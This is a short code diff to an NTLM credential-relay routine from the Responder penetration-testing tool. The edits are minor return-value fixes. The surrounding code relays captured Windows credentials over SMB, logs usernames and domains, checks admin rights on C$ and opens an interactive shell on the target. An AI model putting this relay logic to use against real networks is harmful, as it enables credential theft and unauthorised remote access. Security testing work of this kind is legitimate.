@@ -264,7 +264,7 @@ def HTTPProxyRelay():
                               smbdata = s.recv(2048)
    	                      return smbdata, s, addr[0], Username, Domain
                            else:
-                              return None, None, None, None, None
+                              return None
 	    else:
                 Response = WPAD_Auth_407_Ans()
 	        conn.send(str(Response))
@@ -286,10 +286,11 @@ def RunPsExec(Host):
     if data[8:10] == "\x73\x6d":
         print "[+] Relay failed, Logon Failure. This user doesn't have an account on this target.\n[+] Hashes were saved anyways in Responder/logs/ folder."
         Logs.info(clientIP+":"+Username+":"+Domain+":"+Host[0]+":Logon Failure")
-
+        return False
     if data[8:10] == "\x73\x8d":
         print "[+] Relay failed, STATUS_TRUSTED_RELATIONSHIP_FAILURE returned. Credentials are good, but user is probably not using the target domain name in his credentials.\n"
         Logs.info(clientIP+":"+Username+":"+Domain+":"+Host[0]+":Logon Failure")
+        return False
 
     ## First, check if user has admin privs on C$:    
     ## Tree Connect
@@ -320,7 +321,7 @@ def RunPsExec(Host):
         s.send(buffer1)
         data = s.recv(2048)
 
-    ## NtCreateAndx
+    ## Go to NtCreateAndx
     if data[8:10] == "\x75\x00":
         print "[+] Dropping into Responder's interactive shell, type \"exit\" to terminate\n"
 
